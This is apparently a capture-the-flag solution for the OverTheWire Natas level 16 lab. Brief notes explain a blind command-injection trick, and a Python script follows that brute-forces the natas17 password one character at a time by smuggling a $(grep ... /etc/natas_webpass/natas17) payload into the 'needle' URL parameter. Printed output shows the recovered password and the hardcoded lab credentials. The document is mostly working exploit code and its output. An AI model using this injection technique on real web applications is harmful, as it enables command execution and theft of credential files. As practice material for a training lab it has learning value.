"""
- use $() command in GNU to create payload: $(grep -E ^§a§.* /etc/natas_webpass/natas17)African, -E is regex.
- First run $(grep -E ^§a§.* /etc/natas_webpass/natas17)African, return 'abcxyzAfrican', then run $(grep -i 'abcxyzAfrican' dictionary.txt)
- Because 'African' is one word in dictionary.txt, if first command return None value -> the second command return 'African'. 
Vice versa, if first command return value -> the second command return None value, because the word not in dictionary.txt
-> We use blind injection to get password (char by char)

"""
#!/bin/python3
import requests,string

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

characters = ''.join([string.ascii_letters,string.digits])
print(characters)


word_in_dictionary = 'African'

password = []

for i in range(1,34):
    for char in characters:
        uri = "{}?needle=$(grep -E ^{}{}.* /etc/natas_webpass/natas17){}".format(url,''.join(password),char,word_in_dictionary)
        r = requests.get(uri, auth=(auth_username,auth_password))
        if word_in_dictionary not in r.text:
            password.append(char)
            print(''.join(password))
            break
        else: 
            continue
"""
8
8P
8Ps
8Ps3
8Ps3H
8Ps3H0
8Ps3H0G
8Ps3H0GW
8Ps3H0GWb
8Ps3H0GWbn
8Ps3H0GWbn5
8Ps3H0GWbn5r
8Ps3H0GWbn5rd
8Ps3H0GWbn5rd9
8Ps3H0GWbn5rd9S
8Ps3H0GWbn5rd9S7
8Ps3H0GWbn5rd9S7G
8Ps3H0GWbn5rd9S7Gm
8Ps3H0GWbn5rd9S7GmA
8Ps3H0GWbn5rd9S7GmAd
8Ps3H0GWbn5rd9S7GmAdg
8Ps3H0GWbn5rd9S7GmAdgQ
8Ps3H0GWbn5rd9S7GmAdgQN
8Ps3H0GWbn5rd9S7GmAdgQNd
8Ps3H0GWbn5rd9S7GmAdgQNdk
8Ps3H0GWbn5rd9S7GmAdgQNdkh
8Ps3H0GWbn5rd9S7GmAdgQNdkhP
8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
"""